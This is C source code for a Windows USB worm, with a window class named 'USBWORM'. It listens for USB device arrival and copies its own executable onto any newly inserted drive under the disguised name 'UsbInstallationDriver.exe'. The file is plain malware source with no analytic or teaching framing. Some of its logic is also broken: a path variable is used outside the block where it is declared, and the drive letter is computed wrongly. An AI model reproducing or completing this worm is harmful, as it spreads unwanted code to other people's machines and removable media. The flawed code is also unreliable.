#include <Windows.h>
#include <dbt.h>
#include <stdio.h>
#include <initguid.h>
#include <usbiodef.h>


LRESULT CALLBACK WndProcRoutine(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nShowCmd)
{
	DWORD dwError = ERROR_SUCCESS;
	WNDCLASSEXW WndClass = { 0 };
	WCHAR lpClassName[] = L"USBWORM";
	ATOM aTable = 0;
	MSG uMessage;
	INT Ret = 0;
	HWND hWnd;

	WndClass.cbSize = sizeof(WndClass);
	WndClass.lpfnWndProc = (WNDPROC)WndProcRoutine;
	WndClass.hInstance = GetModuleHandle(NULL);
	WndClass.lpszClassName = (LPWSTR)lpClassName;

	aTable = RegisterClassExW(&WndClass);
	if (!aTable)
		goto FAILURE;

	hWnd = CreateWindowExW(0, lpClassName, L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
	if(hWnd == NULL)
		goto FAILURE;

	while ((Ret = GetMessageW(&uMessage, NULL, 0, 0)) != ERROR_SUCCESS)
	{
		if (Ret == -1)
			goto FAILURE;

		TranslateMessage(&uMessage);
		DispatchMessageW(&uMessage);
	}

	if(aTable)
		UnregisterClassW(lpClassName, hInstance);

	return ERROR_SUCCESS;

FAILURE:

	dwError = GetLastError();

	if (aTable)
		UnregisterClassW(lpClassName, hInstance);

	return dwError;
}

LRESULT CALLBACK WndProcRoutine(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static HDEVNOTIFY hDeviceNotify;

	switch (uMsg)
	{
		case WM_CREATE:
		{
			DEV_BROADCAST_DEVICEINTERFACE_W NotificationFilter = { 0 };
			PWCHAR szLetter = NULL;
			GUID InterfaceClassGuid = { 0x25dbce51, 0x6c8f, 0x4a72, 0x8a, 0x6d, 0xb5, 0x4c, 0x2b, 0x4f, 0xc8, 0x35 };
			WCHAR szLogicalDrives[MAX_PATH] = { 0 };
			DWORD dwResults = ERROR_SUCCESS;
			WCHAR tCurrentPath[MAX_PATH] = { 0 };
			WCHAR tPayloadPath[MAX_PATH] = { 0 };

			NotificationFilter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE_W);
			NotificationFilter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
			NotificationFilter.dbcc_classguid = GUID_DEVINTERFACE_USB_DEVICE;

			hDeviceNotify = RegisterDeviceNotificationW(hWnd, &NotificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);
			if (hDeviceNotify == NULL)
				ExitProcess(GetLastError());

			break;
		}

		case WM_DEVICECHANGE:
		{
			PDEV_BROADCAST_HDR lpDev = (PDEV_BROADCAST_HDR)lParam;
			PDEV_BROADCAST_DEVICEINTERFACE_W Dev = NULL;
			PDEV_BROADCAST_VOLUME lpVolume = NULL;
			DWORD dwMask = 0;
			WCHAR tPayloadPath[MAX_PATH] = { 0 };
			switch (wParam)
			{
				case DBT_DEVNODES_CHANGED:
				{
					Sleep(10);
					break;
				}
				case DBT_DEVICEARRIVAL:
				{
					if (lpDev->dbch_devicetype == 2 || lpDev->dbch_devicetype == 5)
					{

						if (lpDev->dbch_devicetype == 5)
						{
							Dev = (PDEV_BROADCAST_DEVICEINTERFACE_W)lParam;
						}

						lpVolume = (PDEV_BROADCAST_VOLUME)lpDev;
						if (lpVolume->dbcv_flags & DBTF_MEDIA)
						{
							CHAR X;
							dwMask = lpVolume->dbcv_unitmask;

							for (X = 0; X < 26; X++)
							{
								if (dwMask & 1)
									break;

								dwMask = dwMask >> 1;
							}


							if (GetModuleFileNameW(NULL, tCurrentPath, MAX_PATH) == 0)
								ExitProcess(0);

							swprintf(tPayloadPath, MAX_PATH, L"%c:\\UsbInstallationDriver.exe", dwMask);

							if (!CopyFileW(tCurrentPath, tPayloadPath, FALSE))
								ExitProcess(0);
						}

						break;
					}
				}
			}
			break;
		}

		case DBT_DEVICEREMOVECOMPLETE:
			break;

		case WM_CLOSE:
		case WM_DESTROY:
		{
			if(hDeviceNotify)
				UnregisterDeviceNotification(hDeviceNotify);

			break;
		}

		default:
		{
			return DefWindowProc(hWnd, uMsg, wParam, lParam);
			break;
		}

	}

	return ERROR_SUCCESS;
}
